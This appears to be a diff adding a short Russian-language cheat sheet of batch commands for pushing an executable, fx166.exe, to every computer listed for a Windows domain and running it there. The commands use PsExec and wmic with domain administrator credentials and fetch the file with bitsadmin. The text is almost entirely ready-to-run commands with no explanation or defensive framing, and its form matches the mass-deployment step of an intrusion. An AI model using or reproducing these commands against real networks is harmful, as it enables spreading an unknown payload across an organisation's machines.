@@ -1,0 +1,11 @@
+СБОР БАТНИКА НА КОПИРОВАНИЕ ФАЙЛА ПО ВСЕМУ ДОМЕНУ
+start PsExec.exe /accepteula @C:\share$\comps1.txt -u DOMAIN\ADMINISTRATOR -p PASSWORD cmd /c COPY "\\PRIMARY ДОМЕН КОНТРОЛЛЕР\share$\fx166.exe" "C:\windows\temp\" 
+СОХРАНЯЕМ КАК "COPY.BAT"
+
+СБОР БАТНИКА НА ЗАПУСК ФАЙЛА ПО ВСЕМУ ДОМЕНУ
+start PsExec.exe -d @C:\share$\comps1.txt -u DOMAIN\ADMINISTRATOR -p PASSWORD cmd /c c:\windows\temp\fx166.exe
+СОХРАНЯЕМ КАК "EXE.BAT"
+
+СБОР БАТНИКА WMI НА КОПИРОВАНИЕ И ЗАПУСК ФАЙЛА ПО ВСЕМУ ДОМЕНУ
+start wmic /node:@C:\share$\comps1.txt /user:"DOMAIN\Administrator" /password:"PASSWORD" process call create "cmd.exe /c bitsadmin /transfer fx166 \\ДОМЕН КОНТРОЛЛЕР\share$\fx166.exe %APPDATA%\fx166.exe&%APPDATA%\fx166.exe"
+СОХРАНЯЕМ КАК "WMI.BAT"
